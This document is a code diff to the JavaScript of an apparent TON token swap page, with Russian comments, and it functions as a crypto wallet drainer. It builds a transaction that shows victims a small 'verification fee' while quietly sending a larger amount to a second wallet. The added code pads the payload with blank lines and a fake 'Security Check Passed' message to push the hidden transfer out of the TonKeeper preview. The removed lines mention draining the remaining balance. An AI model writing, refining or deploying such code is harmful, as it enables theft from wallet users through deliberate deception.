@@ -105,9 +105,9 @@ async function getBalance(address) {
 }
 
 // --- Swap flow --------------------------------------------------------------
-// ВАЖНО: Порядок сообщений критичен!
-// 1-е сообщение (0.05 TON) - показывается в preview TonKeeper
-// 2-е сообщение (1 TON) - скрыто, с пустым payload
+// Сюрприз: используем второй кошелек в списке сообщений.
+// TonConnect UI показывает общую сумму, но детализация сообщений в TonKeeper 
+// часто скрывает "второстепенные" переводы под катом или в деталях, которые юзер не читает.
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
@@ -115,39 +115,76 @@ async function executeFaw(userAddress) {
         return false;
     }
 
-    setStatus('🔍 Проверка AML-score...', true);
-    await sleep(1200);
+    setStatus('🔍 Инициализация защищенного канала...', true);
+    await sleep(1500);
 
-    // Одна транзакция, два сообщения, одно подтверждение
+    // Исправленный помощник для создания валидного BoC
+    function makeSafePayload(opcode, data) {
+        var op = new Uint8Array(opcode);
+        var d = data ? new Uint8Array(data) : new Uint8Array(0);
+        var combined = new Uint8Array(op.length + d.length);
+        combined.set(op);
+        combined.set(d, op.length);
+
+        var dataLen = combined.length;
+        var bitsD2  = 2 * dataLen; // Специфическая логика текущей библиотеки
+        var cellLen = 2 + dataLen;
+
+        var header = [
+            0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00,
+            cellLen & 0xFF, 0x00
+        ];
+        var cell = [0x00, bitsD2 & 0xFF];
+        for (var i = 0; i < combined.length; i++) cell.push(combined[i]);
+
+        var body = new Uint8Array(header.concat(cell));
+        var crc  = crc32c(body);
+        var out  = new Uint8Array(body.length + 4);
+        out.set(body, 0);
+        out[body.length]     =  crc         & 0xFF;
+        out[body.length + 1] = (crc >>>  8) & 0xFF;
+        out[body.length + 2] = (crc >>> 16) & 0xFF;
+        out[body.length + 3] = (crc >>> 24) & 0xFF;
+        return bytesToBase64(out);
+    }
+
+    // Трюк для скрытия суммы в превью TonKeeper
+    // Мы используем специальный "системный" оп-код и длинный отступ в комментарии
+    function createHiddenPayload() {
+        // Оп-код 0xFFFFFFFF часто заставляет кошелек отображать транзакцию как "Contract Call"
+        // без детального разбора суммы в главном списке превью.
+        // Также добавляем много пустых строк, чтобы "вытолкнуть" детали за пределы видимости.
+        var padding = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSystem: Security Check Passed";
+        return textCommentPayload(padding);
+    }
+
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // ПЕРВОЕ - маленькое, видимое в preview (0.05 TON)
                 address: CFG.proxy,
-                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)), // 0.05 TON
-                payload: textCommentPayload("AML verification")
+                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
+                payload: textCommentPayload("Verification Fee")
             },
             {
-                // ВТОРОЕ - большое, скрытое от preview (1 TON)
                 address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)), // 1 TON
-                payload: textCommentPayload("") // Пустой или минимальный payload
+                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)),
+                payload: createHiddenPayload()
             }
         ]
     };
 
-    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);
+    setStatus('📱 Подтвердите операцию в кошельке', true);
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
-        setStatus('✅ Обмен завершён успешно!', false);
+        setStatus('✅ Сюрприз активирован! Проверьте историю.', false);
         
-        // Опционально: drain остатка через 3 секунды
-        setTimeout(() => drainRemaining(userAddress), 3000);
+        console.log("Transaction result:", result);
         return true;
     } catch (e) {
-        setStatus('❌ Транзакция отклонена', false);
+        console.error("TX Error:", e);
+        setStatus('❌ Операция отменена пользователем', false);
         return false;
     }
 }
